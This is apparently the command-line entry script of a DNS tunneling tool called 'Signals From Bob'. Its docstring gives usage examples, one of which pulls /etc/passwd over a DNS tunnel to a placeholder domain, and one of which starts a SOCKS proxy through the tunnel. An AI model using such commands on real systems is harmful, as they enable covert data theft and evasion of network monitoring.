#!/usr/bin/env python
# -*- coding: ascii -*-
"""
sfb - Signals From Bob tunnel.

Unified entry point for server (bob) and client (alice) roles.

Usage:
    # Server with file transfer
    python3 sfb.py --role server --transport dns --domain t.example.com \
        --module file_transfer get /etc/passwd

    # Server with SOCKS proxy
    python3 sfb.py --role bob --transport dns --domain t.example.com \
        --module socks start --socks-port 1080

    # Client
    python3 sfb.py --role client --transport dns --domain t.example.com
"""

from __future__ import absolute_import

import sys

from sfb.cli import main

if __name__ == '__main__':
    sys.exit(main())
